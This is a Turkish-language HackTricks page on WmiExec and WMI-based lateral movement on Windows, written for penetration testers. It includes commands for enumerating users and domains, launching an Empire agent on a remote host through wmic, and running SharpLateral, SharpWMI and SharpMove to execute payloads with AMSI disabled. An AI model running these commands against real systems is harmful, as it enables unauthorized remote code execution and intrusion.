# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl Çalıştığı Açıklanıyor

WMI kullanılarak username ve password veya hash bilinen host'larda process'ler açılabilir. Komutlar, Wmiexec tarafından WMI kullanılarak yürütülür ve semi-interactive shell deneyimi sağlanır.

**dcomexec.py:** Farklı DCOM endpoint'lerinden yararlanan bu script, özellikle ShellBrowserWindow DCOM object'ini kullanarak wmiexec.py'ye benzer bir semi-interactive shell sunar. Şu anda MMC20. Application, Shell Windows ve Shell Browser Window object'lerini desteklemektedir. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>

## WMI Temelleri

### Namespace

Directory tarzı bir hierarchy içinde yapılandırılan WMI'ın top-level container'ı \root'tur; bunun altında namespace olarak adlandırılan ek directory'ler düzenlenir.<sup>[[1]](#references)</sup>
Namespace'leri listeleme komutları:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Bir namespace içindeki sınıflar şu kullanılarak listelenebilir:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Sınıflar**

win32_process gibi bir WMI sınıf adını ve bulunduğu namespace'i bilmek, herhangi bir WMI işlemi için kritik öneme sahiptir.
`win32` ile başlayan sınıfları listeleme komutları:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Bir sınıfın çağrılması:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Yöntemler

WMI sınıflarının bir veya daha fazla çalıştırılabilir işlevi olan yöntemler yürütülebilir.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Servis Durumu

WMI servisinin çalışır durumda olup olmadığını doğrulamak için komutlar:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Sistem ve İşlem Bilgileri

WMI aracılığıyla sistem ve işlem bilgilerini toplama:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Saldırganlar için WMI, sistemler veya domain'ler hakkında hassas verileri enumerate etmek için güçlü bir araçtır.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
WMI'nin belirli bilgileri, örneğin yerel admin'leri veya oturum açmış kullanıcıları uzaktan sorgulaması, dikkatli komut oluşturmayla mümkündür.

### **Manual Remote WMI Querying**

Uzak bir makinedeki yerel admin'lerin ve oturum açmış kullanıcıların stealthy şekilde tespit edilmesi, belirli WMI sorguları kullanılarak gerçekleştirilebilir. `wmic`, komutları aynı anda birden fazla node üzerinde çalıştırmak için bir metin dosyasından okuma özelliğini de destekler.<sup>[[1]](#references)</sup>

WMI üzerinden bir process'i uzaktan çalıştırmak, örneğin bir Empire agent dağıtmak için aşağıdaki komut yapısı kullanılır. Başarılı çalıştırma, "0" dönüş değeriyle belirtilir:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Bu süreç, WMI'ın uzaktan çalıştırma ve sistem enumerasyonu yeteneğini göstererek hem sistem yönetimi hem de penetration testing için kullanım alanını vurgular.

## Automatic Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacket'ın `wmiexec` aracını** da kullanabilirsiniz.


## Referanslar

- [1] [Windows Kutularını Ele Geçirmek için Kimlik Bilgilerini Kullanma - Bölüm 3 (WMI ve WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Impacket Tool Kit için Başlangıç Rehberi - Bölüm 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)


{{#include ../../banners/hacktricks-training.md}}
